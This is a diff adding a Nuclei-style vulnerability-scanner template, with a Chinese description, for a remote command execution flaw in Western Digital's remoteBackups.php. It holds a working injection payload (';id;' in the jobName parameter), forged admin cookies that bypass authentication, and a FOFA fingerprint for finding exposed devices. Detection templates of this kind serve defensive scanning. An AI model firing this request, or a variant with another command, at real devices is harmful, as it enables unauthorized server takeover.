@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - uid=
+            - gid=
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /web/php/remoteBackups.php?cmd=getRecoverItems&jobName=";id;" HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+          Cookie: isAdmin=1; username=admin;
+id: xibushuju-remoteBackups_php-RCE
+info:
+    author: Superhero
+    description: |-
+        fofa: icon_hash="-1074357885"
+        西部数据 remoteBackups.php 存在远程命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。
+    name: 西部数据 remoteBackups.php 远程命令执行漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/e3U4fam2WTNChsj3WuJ3uA
+    severity: high
+    tags: []
